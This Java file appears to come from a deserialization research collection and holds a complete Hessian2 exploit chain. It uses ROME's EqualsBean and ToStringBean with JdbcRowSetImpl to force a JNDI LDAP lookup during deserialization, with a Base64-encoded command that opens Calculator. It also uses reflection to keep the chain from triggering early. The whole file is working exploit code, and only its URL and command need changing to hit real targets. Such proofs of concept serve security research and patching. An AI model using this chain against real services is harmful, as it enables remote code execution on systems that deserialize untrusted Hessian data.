package org.su18.serialize.hessian.Rome;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.su18.serialize.utils.HessianUtils;

import javax.sql.rowset.BaseRowSet;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @author su18
 */
public class Rome1 {

	public static void main(String[] args) throws Exception {

		JdbcRowSetImpl rs = new JdbcRowSetImpl();

		// open -a Calculator.app
		String jndiUrl = "ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==";

		rs.setDataSourceName(jndiUrl);
		rs.setMatchColumn("su18");

		Field f = BaseRowSet.class.getDeclaredField("listeners");
		f.setAccessible(true);
		f.set(rs, null);

		ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);

		EqualsBean root = new EqualsBean(String.class, "su18");

		HashMap map = new HashMap();
		map.put(root, "su18");


		// 将 EqualsBean put 到 map 之后再反射写入 ToStringBean 避免 put 时触发
		Field f2 = EqualsBean.class.getDeclaredField("_beanClass");
		f2.setAccessible(true);
		f2.set(root, BaseRowSet.class);

		Field f3 = EqualsBean.class.getDeclaredField("_obj");
		f3.setAccessible(true);
		f3.set(root, item);

		byte[] baos = HessianUtils.hessianSerialize(map, "hessian2");
		HessianUtils.hessianSerializeToObj(baos,"hessian2");
	}

}
